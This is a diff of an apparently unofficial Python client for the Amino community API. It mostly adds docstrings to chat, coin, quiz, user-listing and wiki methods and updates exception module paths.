     def clear_notifications(self):
+        """
+        Remove all notifications.
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.delete(f"/x{self.comId}/s/notification", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def start_chat(self, userId: Union[str, list], message: str, title: str = None, content: str = None, isGlobal: bool = False, publishToGlobal: bool = False):
+        """
+        Start an Chat with an User or List of Users.
+
+        **Parameters**
+            - **userId** : ID of the User or List of User IDs.
+            - **message** : Starting Message.
+            - **title** : Title of Group Chat.
+            - **content** : Content of Group Chat.
+            - **isGlobal** : If Group Chat is Global.
+            - **publishToGlobal** : If Group Chat should show in Global.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         if isinstance(userId, str): userIds = [userId]
         elif isinstance(userId, list): userIds = userId
         else: raise exceptions.WrongType(type(userId))
 
         data = {
             "title": title,
             "inviteeUids": userIds,
@@ -567,14 +1011,26 @@
         
         response = self.session.post(f"/x{self.comId}/s/chat/thread", data=data, headers=self.additional_headers(data=data))
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.Thread(response.json()["thread"]).Thread
 
     def invite_to_chat(self, userId: Union[str, list], chatId: str):
+        """
+        Invite a User or List of Users to a Chat.
+
+        **Parameters**
+            - **userId** : ID of the User or List of User IDs.
+            - **chatId** : ID of the Chat.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         if isinstance(userId, str): userIds = [userId]
         elif isinstance(userId, list): userIds = userId
         else: raise exceptions.WrongType(type(userId))
 
         data = dumps({
             "uids": userIds,
             "timestamp": int(timestamp() * 1000)
@@ -582,20 +1038,44 @@
         
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/invite", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def add_to_favorites(self, userId: str):
+        """
+        Adding user to favotites.
+
+        **Parameters**
+            - **userId** : ID of the User.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         response = self.session.post(f"/x{self.comId}/s/user-group/quick-access/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def send_coins(self, coins: int, blogId: str = None, chatId: str = None, objectId: str = None, transactionId: str = None):
+        """
+        Sending coins.
+
+        **Parameters**
+            - **blogId** : ID of the Blog.
+            - **chatId** : ID of the Chat.
+            - **objectId** : ID of ...some object.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         url = None
         if transactionId is None: transactionId = str(UUID(hexlify(urandom(16)).decode('ascii')))
 
         data = {
             "coins": coins,
             "tippingContext": {"transactionId": transactionId},
             "timestamp": int(timestamp() * 1000)
@@ -614,14 +1094,26 @@
         
         response = self.session.post(url, headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def thank_tip(self, chatId: str, userId: str):
+        """
+        Thank you for the rose. :heart:
+
+        **Parameters**
+            - **chatId** : ID of the Blog.
+            - **userId** : ID of the Chat.
+
+        **Returns**
+            - **Success** : 200 (int)
+
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
+        """
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/tipping/tipped-users/{userId}/thank", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def follow(self, userId: Union[str, list]):
         """
@@ -629,15 +1121,15 @@
 
         **Parameters**
             - **userId** : ID of the User or List of IDs of the Users.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str):
             response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/member", headers=self.additional_headers())
 
         elif isinstance(userId, list):
             data = dumps({"targetUidList": userId, "timestamp": int(timestamp() * 1000)})
             
@@ -655,15 +1147,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/x{self.comId}/s/user-profile/{self.profile.userId}/joined/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def block(self, userId: str):
@@ -672,15 +1164,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/x{self.comId}/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def unblock(self, userId: str):
@@ -689,32 +1181,32 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/x{self.comId}/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def visit(self, userId: str):
         """
-        Visit an User.
+        Visit an User. Seems like not working anymore.
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}?action=visit", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def flag(self, reason: str, flagType: int, userId: str = None, blogId: str = None, wikiId: str = None, asGuest: bool = False):
@@ -728,15 +1220,15 @@
             - **blogId** : ID of the Blog.
             - **wikiId** : ID of the Wiki.
             - *asGuest* : Execute as a Guest.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if reason is None: raise exceptions.ReasonNeeded()
         if flagType is None: raise exceptions.FlagTypeNeeded()
 
         data = {
             "flagType": flagType,
             "message": reason,
@@ -797,15 +1289,15 @@
             - **embedType** : Type of the AttachedObject Embed. Works only in AttachedObject Embeds.
             - **embedTitle** : Title of the Embed. Works only in AttachedObject Embeds.
             - **embedContent** : Content of the Embed. Works only in AttachedObject Embeds.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if message is not None and file is None:
             message = message.replace("<$", "‎‏").replace("$>", "‬‭")
 
         mentions = []
         if mentionUserIds:
@@ -898,15 +1390,15 @@
             - **chatId** : ID of the Chat.
             - **asStaff** : If execute as a Staff member (Leader or Curator).
             - **reason** : Reason of the action to show on the Moderation History.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "adminOpName": 102,
             # "adminOpNote": {"content": reason},
             "timestamp": int(timestamp() * 1000)
         }
         if asStaff and reason:
@@ -927,15 +1419,15 @@
         **Parameters**
             - **messageId** : ID of the Message.
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "messageId": messageId,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/mark-as-read", headers=self.additional_headers(data=data), data=data)
@@ -964,15 +1456,15 @@
             - **publishToGlobal** : If the Chat should show on Public Chats or not.
             - **doNotDisturb** : If the Chat should Do Not Disturb or not.
             - **pinChat** : If the Chat should Pinned or not.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {"timestamp": int(timestamp() * 1000)}
 
         if title: data["title"] = title
         if content: data["content"] = content
         if icon: data["icon"] = icon
         if keywords: data["keywords"] = keywords
@@ -1063,36 +1555,82 @@
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: res.append(exceptions.CheckException(response))
         else: res.append(response.status_code)
 
         return res
 
     def transfer_host(self, chatId: str, userIds: list):
+        """
+        Transfering host in chat.
+
+        Accepting:
+        - chatId: str
+        - userIds: list[str]
+            - who are your princes and princesses that will have chat as inheritance?
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "uidList": userIds,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/transfer-organizer", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def transfer_organizer(self, chatId: str, userIds: list):
+        """
+        Transfering host in chat. (Alias of function `transfer_host`.)
+
+        Accepting:
+        - chatId: str
+        - userIds: list[str]
+            - who are your princes and princesses that will have chat as inheritance?
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         self.transfer_host(chatId, userIds)
 
     def accept_host(self, chatId: str, requestId: str):
+        """
+        Accepting host in chat.
+
+        Accepting:
+        - chatId: str
+        - requestId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({})
         
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/transfer-organizer/{requestId}/accept", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def accept_organizer(self, chatId: str, requestId: str):
+        """
+        Accepting host in chat. (Alias to function `accept_host`.)
+
+        Accepting:
+        - chatId: str
+        - requestId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         self.accept_host(chatId, requestId)
 
     def kick(self, userId: str, chatId: str, allowRejoin: bool = True):
         if allowRejoin: allowRejoin = 1
         if not allowRejoin: allowRejoin = 0
         response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}/member/{userId}?allowRejoin={allowRejoin}", headers=self.additional_headers())
         if response.status_code != 200: 
@@ -1105,15 +1643,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def leave_chat(self, chatId: str):
@@ -1122,15 +1660,15 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
         
     def delete_chat(self, chatId: str):
@@ -1139,22 +1677,37 @@
 
         **Parameters**
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
         
     def subscribe(self, userId: str, autoRenew: str = False, transactionId: str = None):
+        """
+        Subscibing to VIP person.
+
+        Accepting:
+        - userId: str
+            - id of object that you wanna buy
+        - isAutoRenew: bool = False
+            - do you wanna auto renew your subscription?
+        - transactionId: str = None
+            - unique id of transaction
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if transactionId is None: transactionId = str(UUID(hexlify(urandom(16)).decode('ascii')))
 
         data = dumps({
             "paymentContext": {
                 "transactionId": transactionId,
                 "isAutoRenew": autoRenew
             },
@@ -1163,32 +1716,70 @@
         
         response = self.session.post(f"/x{self.comId}/s/influencer/{userId}/subscribe", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def promotion(self, noticeId: str, type: str = "accept"):
+        """
+        Accept or deny promotion to curator/leader/agent.
+
+        Accepting:
+        - noticeId: str
+            - get from `get_notices`
+        - type: str = "accept"
+            - or you wanna decline? :)
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.post(f"/x{self.comId}/s/notice/{noticeId}/{type}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def play_quiz_raw(self, quizId: str, quizAnswerList: list, quizMode: int = 0):
+        """
+        Send quiz results.
+
+        Accepting:
+        - quizId: str
+        - quizAnswerList: list
+        - quizMode: int = 0
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "mode": quizMode,
             "quizAnswerList": quizAnswerList,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/blog/{quizId}/quiz/result", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def play_quiz(self, quizId: str, questionIdsList: list, answerIdsList: list, quizMode: int = 0):
+        """
+        Send quiz results.
+
+        Accepting:
+        - quizId: str
+        - questionIdsList: list
+        - answerIdsList: list
+        - quizMode: int = 0
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         quizAnswerList = []
 
         for question, answer in zip(questionIdsList, answerIdsList):
             part = dumps({
                 "optIdList": [answer],
                 "quizQuestionId": question,
                 "timeSpent": 0.0
@@ -1204,60 +1795,130 @@
         
         response = self.session.post(f"/x{self.comId}/s/blog/{quizId}/quiz/result", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def vc_permission(self, chatId: str, permission: int):
-        """Voice Chat Join Permissions
-        1 - Open to Everyone
-        2 - Approval Required
-        3 - Invite Only
+        """
+        Manage permissions to VC.
+
+        Accepting:
+        - chatId: str
+        - permission: int
+            - 1 = Open to Everyone
+            - 2 = Approval Required
+            - 3 = Invite Only
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
         """
         data = dumps({
             "vvChatJoinType": permission,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/vvchat-permission", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     def get_vc_reputation_info(self, chatId: str):
+        """
+        Get info about reputation that you got from VC.
+
+        Accepting:
+        - chatId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/avchat-reputation", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.VcReputation(response.json()).VcReputation
 
     def claim_vc_reputation(self, chatId: str):
+        """
+        Claim reputation that you got from VC.
+
+        Accepting:
+        - chatId: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/avchat-reputation", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.VcReputation(response.json()).VcReputation
 
     def get_all_users(self, type: str = "recent", start: int = 0, size: int = 25):
+        """
+        Get info about all members.
+
+        Accepting:
+        - type: str
+            - can be only "recent", "banned", "featured", "leaders" and "curators"
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if type == "recent": response = self.session.get(f"/x{self.comId}/s/user-profile?type=recent&start={start}&size={size}", headers=self.additional_headers())
         elif type == "banned": response = self.session.get(f"/x{self.comId}/s/user-profile?type=banned&start={start}&size={size}", headers=self.additional_headers())
         elif type == "featured": response = self.session.get(f"/x{self.comId}/s/user-profile?type=featured&start={start}&size={size}", headers=self.additional_headers())
         elif type == "leaders": response = self.session.get(f"/x{self.comId}/s/user-profile?type=leaders&start={start}&size={size}", headers=self.additional_headers())
         elif type == "curators": response = self.session.get(f"/x{self.comId}/s/user-profile?type=curators&start={start}&size={size}", headers=self.additional_headers())
         else: raise exceptions.WrongType(type)
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileCountList(response.json()).UserProfileCountList
 
     def get_online_users(self, start: int = 0, size: int = 25):
+        """
+        Get info about all online members.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/live-layer?topic=ndtopic:x{self.comId}:online-members&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileCountList(response.json()).UserProfileCountList
 
     def get_online_favorite_users(self, start: int = 0, size: int = 25):
+        """
+        Get info about all online favorite members.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/user-group/quick-access?type=online&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileCountList(response.json()).UserProfileCountList
 
     def get_user_info(self, userId: str):
         """
@@ -1265,15 +1926,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`User Object <amino.lib.util.objects.UserProfile>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfile(response.json()["userProfile"]).UserProfile
 
     def get_user_following(self, userId: str, start: int = 0, size: int = 25):
@@ -1284,15 +1945,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/joined?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def get_user_followers(self, userId: str, start: int = 0, size: int = 25):
@@ -1303,15 +1964,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/member?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def get_user_visitors(self, userId: str, start: int = 0, size: int = 25):
@@ -1322,46 +1983,100 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Visitors List <amino.lib.util.objects.visitorsList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/visitors?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.VisitorsList(response.json()).VisitorsList
 
     def get_user_checkins(self, userId: str):
+        """
+        Get info about user's check ins.
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `UserCheckIns`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/check-in/stats/{userId}?timezone={-timezone // 1000}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserCheckIns(response.json()).UserCheckIns
 
     def get_user_blogs(self, userId: str, start: int = 0, size: int = 25):
+        """
+        Get info about user's blogs.
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `BlogList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/blog?type=user&q={userId}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.BlogList(response.json()["blogList"]).BlogList
 
     def get_user_wikis(self, userId: str, start: int = 0, size: int = 25):
+        """
+        Get info about user's wikis.
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `WikiList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/item?type=user-all&start={start}&size={size}&cv=1.2&uid={userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.WikiList(response.json()["itemList"]).WikiList
 
     def get_user_achievements(self, userId: str):
+        """
+        Get info about user's achievements.
+
+        Accepting:
+        - userId: str
+
+        Recieving:
+        - object `UserAchievements`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/achievements", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserAchievements(response.json()["achievements"]).UserAchievements
 
     def get_influencer_fans(self, userId: str, start: int = 0, size: int = 25):
+        """
+        Get all who subscribed to fanclub.
+
+        Accepting:
+        - userId: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `InfluencerFans`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/influencer/{userId}/fans?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.InfluencerFans(response.json()).InfluencerFans
 
     def get_blocked_users(self, start: int = 0, size: int = 25):
         """
@@ -1370,15 +2085,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Users List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = self.session.get(f"/x{self.comId}/s/block?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def get_blocker_users(self, start: int = 0, size: int = 25):
@@ -1388,70 +2103,182 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`List of User IDs <List>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         response = self.session.get(f"/x{self.comId}/s/block?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.json()["blockerUidList"]
 
     def search_users(self, nickname: str, start: int = 0, size: int = 25):
+        """
+        Searching users by nickname.
+
+        Accepting:
+        - nickname: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserProfileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/user-profile?type=name&q={nickname}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def get_saved_blogs(self, start: int = 0, size: int = 25):
+        """
+        Recieve all your saved blogs.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserSavedBlogs`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/bookmark?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserSavedBlogs(response.json()["bookmarkList"]).UserSavedBlogs
 
     def get_leaderboard_info(self, type: str, start: int = 0, size: int = 25):
+        """
+        Recieve all your users from leaderboard.
+
+        Accepting:
+        - type: str
+            - can be only "24"/"hour", "7"/"day", "rep", "check" or "quiz"
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `UserProfileList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         if "24" in type or "hour" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=1&start={start}&size={size}", headers=self.additional_headers())
         elif "7" in type or "day" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=2&start={start}&size={size}", headers=self.additional_headers())
         elif "rep" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=3&start={start}&size={size}", headers=self.additional_headers())
         elif "check" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=4", headers=self.additional_headers())
         elif "quiz" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=5&start={start}&size={size}", headers=self.additional_headers())
         else: raise exceptions.WrongType(type)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
     def get_wiki_info(self, wikiId: str):
+        """
+        Get all things about wiki post.
+
+        Accepting:
+        - wikiId: str
+
+        Recieving:
+        - object `GetWikiInfo`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/item/{wikiId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.GetWikiInfo(response.json()).GetWikiInfo
 
     def get_recent_wiki_items(self, start: int = 0, size: int = 25):
+        """
+        Get all recent wiki items.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `WikiList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/item?type=catalog-all&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.WikiList(response.json()["itemList"]).WikiList
 
     def get_wiki_categories(self, start: int = 0, size: int = 25):
+        """
+        Get all wiki categories.
+
+        Accepting:
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `WikiCategoryList`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/item-category?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return objects.WikiCategoryList(response.json()["itemCategoryList"]).WikiCategoryList
 
     def get_wiki_category(self, categoryId: str, start: int = 0, size: int = 25):
+        """
+        Get all wiki from category.
+
+        Accepting:
+        - categoryId: str
+        - start: int = 0
+            - start pos
+        - size: int = 25
+            - how much you want to get
+
+        Recieving:
+        - object `WikiCategory`
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         response = self.session.get(f"/x{self.comId}/s/item-category/{categoryId}?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
